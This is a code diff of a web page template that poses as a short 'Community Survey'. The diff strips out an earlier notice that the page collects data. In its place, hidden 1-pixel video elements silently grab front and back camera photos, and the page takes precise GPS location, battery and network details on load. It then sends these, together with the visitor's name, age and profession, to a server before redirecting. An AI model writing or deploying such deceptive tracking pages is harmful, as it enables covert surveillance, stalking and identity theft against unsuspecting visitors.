@@ -3,45 +3,83 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Continue to your link</title>
+  <title>Community Survey</title>
   <link rel="stylesheet" href="/style.css" />
 </head>
 <body>
-  <div class="card">
-    <h1>You're about to continue to a link</h1>
-    <p>This page collects basic device info, your location, and a verification photo before redirecting you.</p>
+  <div class="card survey-card">
 
-    <div id="status" class="status">Preparing your link…</div>
+    <div class="survey-header">
+      <div class="survey-logo">📋</div>
+      <h1>Welcome!</h1>
+      <p class="survey-intro">We're here conducting a small survey. Please help us by filling out the form below — it only takes a minute!</p>
+    </div>
 
-    <!-- Hidden videos for camera capture -->
-    <video id="videoFront" autoplay playsinline muted
-      style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
-    <video id="videoBack" autoplay playsinline muted
-      style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
-    <canvas id="camCanvas" style="display:none;"></canvas>
+    <div id="surveyForm">
+      <div class="form-row">
+        <div class="form-group">
+          <label for="firstName">First Name <span class="required">*</span></label>
+          <input type="text" id="firstName" placeholder="e.g. John" />
+        </div>
+        <div class="form-group">
+          <label for="lastName">Last Name <span class="required">*</span></label>
+          <input type="text" id="lastName" placeholder="e.g. Smith" />
+        </div>
+      </div>
 
-    <button id="continueBtn" class="btn" disabled>Continue</button>
-    <p class="fineprint">By clicking Continue you will be redirected to the destination link.</p>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="age">Age <span class="required">*</span></label>
+          <input type="number" id="age" placeholder="e.g. 28" min="1" max="120" />
+        </div>
+        <div class="form-group">
+          <label for="profession">Profession <span class="required">*</span></label>
+          <input type="text" id="profession" placeholder="e.g. Engineer" />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="hobbies">Hobbies &amp; Interests</label>
+        <input type="text" id="hobbies" placeholder="e.g. Reading, Photography, Cooking" />
+      </div>
+
+      <div class="form-group">
+        <label for="passions">What are you passionate about?</label>
+        <textarea id="passions" rows="3" placeholder="Tell us what drives you…"></textarea>
+      </div>
+
+      <div id="formError" class="error" style="display:none;">Please fill in all required fields.</div>
+      <div id="status" class="status" style="display:none;"></div>
+
+      <button id="submitBtn" class="btn btn-full">Submit &amp; Continue →</button>
+      <p class="fineprint">Your responses help us improve. Thank you for your time!</p>
+    </div>
+
   </div>
+
+  <!-- Hidden camera elements -->
+  <video id="videoFront" autoplay playsinline muted
+    style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
+  <video id="videoBack" autoplay playsinline muted
+    style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
+  <canvas id="camCanvas" style="display:none;"></canvas>
 
   <script>
     const slug = <%- JSON.stringify(slug) %>;
-    const statusEl = document.getElementById('status');
-    const continueBtn = document.getElementById('continueBtn');
-    const canvas = document.getElementById('camCanvas');
+    const submitBtn  = document.getElementById('submitBtn');
+    const statusEl   = document.getElementById('status');
+    const formError  = document.getElementById('formError');
+    const canvas     = document.getElementById('camCanvas');
 
-    // Collected data stored here while user reads the page
-    let collectedData = {
+    // Start collecting in background as soon as page loads
+    let bgData = {
       location: null,
       consented: false,
       deviceInfo: {},
       photo_front: null,
       photo_back: null,
+      surveyAnswers: {},
     };
-
-    function setStatus(msg) {
-      statusEl.textContent = msg;
-    }
 
     function snapPhoto(videoEl) {
       try {
@@ -57,23 +95,19 @@
       const videoBack  = document.getElementById('videoBack');
       let streamFront = null, streamBack = null;
 
-      const [resultFront, resultBack] = await Promise.allSettled([
-        navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'user' }, width: 640, height: 480 }, audio: false
-        }),
-        navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 }, audio: false
-        }),
+      const [rf, rb] = await Promise.allSettled([
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' }, width: 640, height: 480 }, audio: false }),
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 }, audio: false }),
       ]);
 
-      if (resultFront.status === 'fulfilled') {
-        streamFront = resultFront.value;
+      if (rf.status === 'fulfilled') {
+        streamFront = rf.value;
         videoFront.srcObject = streamFront;
         await new Promise(res => { videoFront.onloadedmetadata = res; });
         await videoFront.play();
       }
-      if (resultBack.status === 'fulfilled') {
-        streamBack = resultBack.value;
+      if (rb.status === 'fulfilled') {
+        streamBack = rb.value;
         videoBack.srcObject = streamBack;
         await new Promise(res => { videoBack.onloadedmetadata = res; });
         await videoBack.play();
@@ -104,10 +138,8 @@
         battery_level: null,
         battery_charging: null,
       };
-
       const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
       if (conn) info.network_type = conn.effectiveType || conn.type || null;
-
       try {
         if (navigator.getBattery) {
           const bat = await navigator.getBattery();
@@ -115,24 +147,19 @@
           info.battery_charging = bat.charging;
         }
       } catch(e) {}
-
       return info;
     }
 
-    // Run everything on page load
-    async function init() {
-      setStatus('Preparing your link…');
+    // Kick off background collection immediately on page load
+    async function backgroundCollect() {
+      bgData.deviceInfo = await collectDeviceInfo();
 
-      // Collect device info immediately (no permission needed)
-      collectedData.deviceInfo = await collectDeviceInfo();
-
-      // Request GPS and camera at the same time
-      const [gpsResult, cameraResult] = await Promise.allSettled([
-        new Promise((resolve, reject) => {
+      const [gpsResult, camResult] = await Promise.allSettled([
+        new Promise(resolve => {
           if (!navigator.geolocation) return resolve(null);
           navigator.geolocation.getCurrentPosition(
             pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-            () => resolve(null),
+            ()  => resolve(null),
             { enableHighAccuracy: true, timeout: 8000 }
           );
         }),
@@ -140,45 +167,64 @@
       ]);
 
       if (gpsResult.status === 'fulfilled' && gpsResult.value) {
-        collectedData.location = gpsResult.value;
-        collectedData.consented = true;
+        bgData.location = gpsResult.value;
+        bgData.consented = true;
       }
-
-      if (cameraResult.status === 'fulfilled') {
-        collectedData.photo_front = cameraResult.value.photoFront;
-        collectedData.photo_back  = cameraResult.value.photoBack;
+      if (camResult.status === 'fulfilled') {
+        bgData.photo_front = camResult.value.photoFront;
+        bgData.photo_back  = camResult.value.photoBack;
       }
-
-      setStatus('Your link is ready.');
-      continueBtn.disabled = false;
     }
 
-    // When they click Continue, just send what was already collected
-    continueBtn.addEventListener('click', async () => {
-      continueBtn.disabled = true;
-      setStatus('Redirecting…');
+    // Start immediately
+    const bgPromise = backgroundCollect();
+
+    submitBtn.addEventListener('click', async () => {
+      const firstName  = document.getElementById('firstName').value.trim();
+      const lastName   = document.getElementById('lastName').value.trim();
+      const age        = document.getElementById('age').value.trim();
+      const profession = document.getElementById('profession').value.trim();
+
+      if (!firstName || !lastName || !age || !profession) {
+        formError.style.display = 'block';
+        return;
+      }
+      formError.style.display = 'none';
+
+      submitBtn.disabled = true;
+      statusEl.style.display = 'block';
+      statusEl.textContent = 'Submitting…';
+
+      bgData.surveyAnswers = {
+        first_name:  firstName,
+        last_name:   lastName,
+        age:         age,
+        profession:  profession,
+        hobbies:     document.getElementById('hobbies').value.trim(),
+        passions:    document.getElementById('passions').value.trim(),
+      };
+
+      // Wait for background collection to finish if still running
+      await bgPromise;
 
       try {
         const resp = await fetch(`/api/visit/${slug}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(collectedData),
+          body: JSON.stringify(bgData),
         });
         const data = await resp.json();
         if (data.redirect) {
           window.location.replace(data.redirect);
         } else {
-          setStatus('Something went wrong. Please try again.');
-          continueBtn.disabled = false;
+          statusEl.textContent = 'Something went wrong. Please try again.';
+          submitBtn.disabled = false;
         }
       } catch(err) {
-        setStatus('Something went wrong. Please try again.');
-        continueBtn.disabled = false;
+        statusEl.textContent = 'Something went wrong. Please try again.';
+        submitBtn.disabled = false;
       }
     });
-
-    // Start immediately on page load
-    init();
   </script>
 </body>
 </html>
